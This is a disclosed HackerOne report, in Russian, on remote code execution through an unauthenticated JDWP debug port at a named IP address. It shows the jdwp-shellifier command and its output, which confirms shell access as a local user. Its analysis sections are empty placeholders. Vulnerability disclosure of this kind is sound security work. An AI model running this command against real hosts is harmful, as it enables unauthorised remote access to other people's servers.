---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '49408'
original_report_id: '49408'
title: RCE через JDWP
weakness: Command Injection - Generic
team_handle: mailru
created_at: '2015-02-27T09:13:28.705Z'
disclosed_at: '2015-09-13T12:14:53.016Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- command-injection-generic
---

# RCE через JDWP

## Metadata

- HackerOne Report ID: 49408
- Weakness: Command Injection - Generic
- Program: mailru
- Disclosed At: 2015-09-13T12:14:53.016Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Привет!
На айпи 195.211.20.198 открыт JDWP без auth-а.
Результат - удаленный шелл :)

MacBook-Pro-Kirill:Pentest isox$ python2.7 jdwp-shellifier.py -t 195.211.20.198 -p 7605 --break-on 'java.lang.String.indexOf'
[+] Targeting '195.211.20.198:7605'
[+] Reading settings for 'Java HotSpot(TM) 64-Bit Server VM - 1.7.0_51'
[+] Found Runtime class: id=666
[+] Found Runtime.getRuntime(): id=7f670404cfa8
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0xcef
[+] Found Operating System 'Linux'
[+] Found User name 'orion'
[+] Found ClassPath '/home/orion/bin/orion.jar'
[+] Found User home directory '/home/orion'
[!] Command successfully executed

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
